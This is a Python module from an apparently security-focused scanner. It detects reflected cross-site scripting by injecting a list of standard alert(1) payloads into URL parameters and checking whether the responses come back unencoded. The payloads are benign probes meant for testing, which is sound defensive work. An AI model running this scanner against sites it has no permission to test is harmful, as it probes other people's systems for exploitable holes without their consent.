"""
PHANTOM — Cross-Site Scripting Detection Module

Detection:
1. Reflected XSS: inject script/img/svg payloads, check if unencoded in response
2. Checks HTML encoding status — entities mean protected
3. Tests URL parameters and form inputs
"""
from __future__ import annotations

import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.target import Target, VulnFinding
from core.findings import Finding, FindingsDB
from core.engine import PhantomEngine
from core.config import PhantomConfig
from utils.http_client import request, Response


class XSSCheck:
    """Cross-Site Scripting detection — reflected XSS."""

    def __init__(self, engine: PhantomEngine):
        self.engine = engine
        self.target = engine.target

    def run(self):
        """Run reflected XSS tests against all discovered URLs."""
        print("[*] Starting XSS checks...")
        findings = 0

        urls = self._collect_urls()
        if not urls:
            print("  [!] No parameterized URLs found to test")
            return

        for url in urls:
            try:
                if self._test_reflected(url):
                    findings += 1
            except Exception as e:
                print(f"  [!] XSS test failed for {url}: {e}")
                continue

        print(f"  [+] XSS checks complete — {findings} finding(s)")

    # ── URL collection ──────────────────────────────────────────────

    def _collect_urls(self) -> list[str]:
        """Collect URLs with parameters from directories and JS endpoints."""
        urls = []
        sources = list(set(
            self.target.directories + self.target.js_endpoints
        ))

        for ep in sources:
            if "?" in ep:
                urls.append(ep)

        # Generate test URLs for common XSS-prone parameters
        xss_params = ["q", "s", "search", "query", "id", "page",
                       "name", "cat", "msg", "message", "text",
                       "comment", "title", "tags", "keyword"]
        for ep in sources:
            clean = ep.split("?")[0]
            for param in xss_params:
                test_url = f"{clean}?{param}=xss_test"
                if test_url not in urls:
                    urls.append(test_url)

        return list(set(urls))

    # ── Reflected XSS detection ─────────────────────────────────────

    def _test_reflected(self, url: str) -> bool:
        """Inject XSS payloads and check for unencoded reflection."""
        payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            '\');alert(1)//',
            '" onmouseover="alert(1)"',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<details open ontoggle=alert(1)>',
            'javascript:alert(1)',
        ]

        first_param = self._get_first_param(url)
        if not first_param:
            return False

        for payload in payloads:
            test_url = self._inject(url, first_param, payload)
            try:
                resp = request(test_url, timeout=10)
                if not resp or not resp.body:
                    continue

                body = resp.body

                # Check if payload appears raw (unencoded)
                if self._is_reflected(body, payload):
                    # Verify it's NOT HTML-entity encoded
                    if not self._is_encoded(body, payload):
                        evidence = self._extract_context(body, payload)
                        self.engine.findings.add(Finding(
                            name="Cross-Site Scripting (Reflected)",
                            severity="HIGH",
                            url=url,
                            param=first_param,
                            payload=payload,
                            evidence=evidence,
                            phase="vuln",
                        ))
                        print(f"  [+] XSS (reflected) @ {url} ?{first_param}")
                        return True
            except Exception:
                continue

        return False

    # ── Reflection checks ───────────────────────────────────────────

    def _is_reflected(self, body: str, payload: str) -> bool:
        """Check if payload appears in response body (any form)."""
        # Direct match
        if payload in body:
            return True
        # URL-encoded match
        from urllib.parse import quote
        encoded = quote(payload)
        if encoded in body:
            return True
        # Partial match — check payload core
        core = re.sub(r'[<>\'"]', '', payload)[:20]
        if core and core in body:
            return True
        return False

    def _is_encoded(self, body: str, payload: str) -> bool:
        """Check if payload is HTML-entity encoded (protected)."""
        # If the special chars are encoded, the XSS won't fire
        encoded_versions = [
            payload.replace("<", "&lt;").replace(">", "&gt;"),
            payload.replace('"', "&quot;").replace("'", "&#39;"),
            payload.replace("<", "&#60;").replace(">", "&#62;"),
        ]
        for ev in encoded_versions:
            if ev in body and payload not in body:
                return True
        return False

    def _extract_context(self, body: str, payload: str, ctx: int = 100) -> str:
        """Extract surrounding context where payload appears."""
        idx = body.find(payload)
        if idx == -1:
            # Try partial match
            core = re.sub(r'[<>\'"]', '', payload)[:20]
            idx = body.find(core)
            if idx == -1:
                return payload[:300]
        start = max(0, idx - ctx)
        end = min(len(body), idx + len(payload) + ctx)
        return body[start:end]

    # ── Helpers ─────────────────────────────────────────────────────

    def _get_first_param(self, url: str) -> str | None:
        """Extract the first query parameter from a URL."""
        if "?" not in url:
            return None
        qs = url.split("?", 1)[1]
        for part in qs.split("&"):
            if "=" in part:
                return part.split("=")[0]
        return None

    def _inject(self, url: str, param: str, payload: str) -> str:
        """Replace parameter value with XSS payload."""
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_qs = urlencode(qs, doseq=True)
        return urlunparse(parsed._replace(query=new_qs))
